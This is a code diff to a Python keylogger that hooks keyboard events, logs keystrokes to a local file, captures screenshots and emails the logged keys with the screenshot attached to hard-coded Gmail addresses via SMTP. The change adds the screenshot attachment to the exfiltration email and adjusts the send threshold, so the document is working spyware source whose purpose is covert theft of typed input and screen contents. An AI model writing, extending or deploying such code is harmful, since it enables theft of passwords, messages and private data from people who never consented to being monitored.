@@ -28,7 +28,8 @@ def screenCapture():
 
 def sendEmail(keyMessage):
     try:
-
+#sdkjnf ksn dfksn fkdns kfndskj nijndfsij nsdijf nsdjn kjndkcnsd dns knkini s
+        screenCapture()
         msg = MIMEMultipart()
         fromaddr = 'keyhunter.hackspc@gmail.com'
         username = 'hackdemdead@gmail.com'
@@ -40,7 +41,15 @@ def sendEmail(keyMessage):
 
         keyMessage += "<br><br>" + "Keys have been logged master"
 
-        msg.attach(MIMEText(keyMessage,'html'))
+        msg.attach(MIMEText(keyMessage, 'html'))
+
+        attachment = open(imagefile, 'rb')
+
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload((attachment).read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', "attachment; filename= " + imagefile)
+        msg.attach(part)
 
         server = smtplib.SMTP('smtp.gmail.com:587')
         server.starttls()
@@ -57,10 +66,8 @@ def OnKeyboardEvent(event):
     file_log = open('keys.txt','r+')
     buffer = file_log.read()
     file_log.close()
-    if len(buffer) > 10:
-        screenCapture()
+    if len(buffer) > 50:
         sendEmail(buffer[-1000:].replace("\n", "<br>"))
-        sys.exit
 
     file_log = open('keys.txt',  'w')
     keylogs = chr(event.Ascii)
@@ -70,9 +77,11 @@ def OnKeyboardEvent(event):
     # if user press space
     if event.Ascii == 32:
         keylogs = '  '
+
     buffer += keylogs
     file_log.write(buffer)
     file_log.close()
+
     return True
 
 #Create hook manager project
